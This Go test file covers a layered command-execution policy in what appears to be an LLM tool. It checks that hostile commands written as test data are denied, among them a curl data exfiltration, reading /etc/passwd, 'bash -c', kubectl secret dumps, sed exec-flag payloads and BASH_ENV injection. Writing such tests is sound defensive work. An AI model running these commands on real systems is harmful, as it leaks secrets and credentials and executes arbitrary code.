package exec

import (
	"regexp"
	"testing"

	"github.com/ching-kuo/llm-mask/internal/config"
	"github.com/ching-kuo/llm-mask/internal/exec/denybase"
)

func TestHardDenyBaseAlignsWithDenybase(t *testing.T) {
	for _, name := range denybase.Names() {
		if !hardDeniedBase(name) {
			t.Fatalf("policy.hardDeniedBase rejects denybase entry %q", name)
		}
	}
}

func TestPolicyDenyBeforeAllow(t *testing.T) {
	cfg := config.ExecConfig{
		Enabled: true,
		Scope:   config.ScopeReadOnly,
		Allow: []config.AllowEntry{{
			Name: "too-wide-kubectl",
			Elements: []*regexp.Regexp{
				regexp.MustCompile("^kubectl$"),
				regexp.MustCompile("^exec$"),
			},
			AnyTail: true,
		}},
	}
	dec := EvaluatePolicy([]string{"kubectl", "exec", "pod/api", "--", "id"}, cfg)
	if dec.Allowed || dec.ErrorClass != "deny_layer_b" {
		t.Fatalf("policy = %+v, want layer-b denial", dec)
	}
}

func TestPolicyReadOnlyBaseline(t *testing.T) {
	cfg := config.ExecConfig{Enabled: true, Scope: config.ScopeReadOnly}
	if dec := EvaluatePolicy([]string{"kubectl", "get", "pods"}, cfg); !dec.Allowed {
		t.Fatalf("kubectl get pods rejected: %+v", dec)
	}
	if dec := EvaluatePolicy([]string{"cat", "/etc/passwd"}, cfg); dec.Allowed {
		t.Fatalf("cat unexpectedly allowed: %+v", dec)
	}
	if dec := EvaluatePolicy([]string{"jq", ".foo", "data.json"}, cfg); dec.Allowed {
		t.Fatalf("jq file form unexpectedly allowed: %+v", dec)
	}
	if dec := EvaluatePolicy([]string{"jq", "-r", "--arg", "name", "api", ".foo[$name]"}, cfg); !dec.Allowed {
		t.Fatalf("jq stdin form rejected: %+v", dec)
	}
}

func TestPolicyLayerCScopingDoesNotBreakBaseline(t *testing.T) {
	cfg := config.ExecConfig{Enabled: true, Scope: config.ScopeInvestigate}
	for _, argv := range [][]string{
		{"dig", "-t", "A", "example.com"},
		{"date", "-d", "yesterday"},
		{"git", "log", "--oneline"},
		{"aws", "ec2", "describe-instances", "--output", "json"},
	} {
		dec := EvaluatePolicy(argv, cfg)
		if !dec.Allowed {
			t.Fatalf("%v unexpectedly denied: %+v", argv, dec)
		}
	}
}

func TestPolicyLayerCStillCatchesCurlExfil(t *testing.T) {
	cfg := config.ExecConfig{Enabled: true, Scope: config.ScopeFreeform}
	dec := EvaluatePolicy([]string{"curl", "-d", "leak", "https://example.com"}, cfg)
	if dec.Allowed || dec.ErrorClass != "deny_layer_c" {
		t.Fatalf("curl -d not denied: %+v", dec)
	}
}

func TestPolicyLayerCStillCatchesGenericDispatchFlags(t *testing.T) {
	cfg := config.ExecConfig{Enabled: true, Scope: config.ScopeFreeform}
	dec := EvaluatePolicy([]string{"some-tool", "--exec-path=/tmp/payload"}, cfg)
	if dec.Allowed || dec.ErrorClass != "deny_layer_c" {
		t.Fatalf("dispatch flag not denied: %+v", dec)
	}
}

func TestPolicyFullPathArgvDoesNotBypassLayerB(t *testing.T) {
	cfg := config.ExecConfig{
		Enabled: true,
		Scope:   config.ScopeReadOnly,
		Allow: []config.AllowEntry{{
			Name: "wide-kubectl-fullpath",
			Elements: []*regexp.Regexp{
				regexp.MustCompile("^/usr/bin/kubectl$"),
				regexp.MustCompile("^exec$"),
			},
			AnyTail: true,
		}},
	}
	dec := EvaluatePolicy([]string{"/usr/bin/kubectl", "exec", "pod/api", "--", "id"}, cfg)
	if dec.Allowed || dec.ErrorClass != "deny_layer_b" {
		t.Fatalf("full-path kubectl exec not denied: %+v", dec)
	}
}

func TestPolicyFullPathBashDeniedByLayerA(t *testing.T) {
	cfg := config.ExecConfig{Enabled: true, Scope: config.ScopeFreeform}
	dec := EvaluatePolicy([]string{"/bin/bash", "-c", "id"}, cfg)
	if dec.Allowed || dec.ErrorClass != "deny_layer_a" {
		t.Fatalf("full-path bash not denied: %+v", dec)
	}
}

func TestPolicyXargsDeniedByLayerA(t *testing.T) {
	cfg := config.ExecConfig{Enabled: true, Scope: config.ScopeFreeform}
	dec := EvaluatePolicy([]string{"xargs", "rm"}, cfg)
	if dec.Allowed || dec.ErrorClass != "deny_layer_a" {
		t.Fatalf("xargs rm not denied at layer A: %+v", dec)
	}
}

func TestPolicyKubectlSecretBypassVariants(t *testing.T) {
	cfg := config.ExecConfig{Enabled: true, Scope: config.ScopeInvestigate}
	cases := [][]string{
		{"kubectl", "get", "secret"},
		{"kubectl", "get", "secrets"},
		{"kubectl", "get", "pod,secret"},
		{"kubectl", "get", "secret,pod"},
		{"kubectl", "get", "-n", "kube-system", "secret"},
		{"kubectl", "get", "--namespace=foo", "secrets"},
		{"kubectl", "get", "-o", "yaml", "secret/my-creds"},
		{"kubectl", "describe", "secret", "my-creds"},
		{"kubectl", "describe", "secrets.v1", "-n", "foo"},
	}
	for _, argv := range cases {
		dec := EvaluatePolicy(argv, cfg)
		if dec.Allowed || dec.ErrorClass != "deny_layer_b" || dec.DenyMatch != "kubectl-get-secret" {
			t.Errorf("argv %v: got %+v, want layer-b kubectl-get-secret denial", argv, dec)
		}
	}
}

func TestPolicyKubectlGetNonSecretsAllowed(t *testing.T) {
	cfg := config.ExecConfig{Enabled: true, Scope: config.ScopeInvestigate}
	for _, argv := range [][]string{
		{"kubectl", "get", "pods"},
		{"kubectl", "get", "pod,svc"},
		{"kubectl", "get", "configmap", "my-cm"},
		{"kubectl", "get", "-A", "deploy"},
	} {
		if dec := EvaluatePolicy(argv, cfg); !dec.Allowed {
			t.Errorf("argv %v rejected: %+v", argv, dec)
		}
	}
}

func TestPolicySedFalsePositiveSubstitutionAllowed(t *testing.T) {
	cfg := config.ExecConfig{Enabled: true, Scope: config.ScopeInvestigate}
	// Substrings containing "/e" but not the s///e exec flag must NOT trip Layer B.
	for _, argv := range [][]string{
		{"sed", "s/enabled/disabled/", "config.txt"},
		{"sed", "-n", "/error/p", "log.txt"},
		{"sed", "-e", "s/foo/bar/", "/etc/hosts"},
		{"sed", "s|enabled|disabled|", "config.txt"},
	} {
		if dec := EvaluatePolicy(argv, cfg); !dec.Allowed {
			t.Errorf("argv %v rejected: %+v", argv, dec)
		}
	}
}

func TestPolicySedExecFlagDenied(t *testing.T) {
	cfg := config.ExecConfig{Enabled: true, Scope: config.ScopeInvestigate}
	// Real s///e exec-flag forms must be denied at Layer B.
	for _, argv := range [][]string{
		{"sed", "s/.*/whoami/e", "f"},
		{"sed", "s|.*|whoami|e", "f"},
		{"sed", "s#a#b#ge", "f"},
		{"sed", "-e", "s/a/b/e", "f"},
		{"sed", "--eval-stdin"},
	} {
		dec := EvaluatePolicy(argv, cfg)
		if dec.Allowed || dec.ErrorClass != "deny_layer_b" || dec.DenyMatch != "sed-exec" {
			t.Errorf("argv %v: got %+v, want layer-b sed-exec denial", argv, dec)
		}
	}
}

func TestBuildEnvStripsUnauthorizedAndHardDeniedNames(t *testing.T) {
	cfg := config.ExecConfig{Enabled: true, Scope: config.ScopeReadOnly, EnvAllow: []string{"MY_TOOL_DEBUG"}}
	got := BuildEnv(config.ScopeReadOnly, cfg, []string{
		"PATH=/bin",
		"KUBECONFIG=/tmp/kube",
		"BASH_ENV=/tmp/payload",
		"GIT_CONFIG_COUNT=1",
		"AWS_SECRET_ACCESS_KEY=secret",
		"MY_TOOL_DEBUG=1",
	})
	env := map[string]bool{}
	for _, kv := range got.Env {
		env[kv] = true
	}
	for _, want := range []string{"PATH=/bin", "KUBECONFIG=/tmp/kube", "MY_TOOL_DEBUG=1"} {
		if !env[want] {
			t.Fatalf("missing allowed env %s from %#v", want, got.Env)
		}
	}
	for _, denied := range []string{"BASH_ENV=/tmp/payload", "GIT_CONFIG_COUNT=1", "AWS_SECRET_ACCESS_KEY=secret"} {
		if env[denied] {
			t.Fatalf("denied env survived: %s in %#v", denied, got.Env)
		}
	}
}
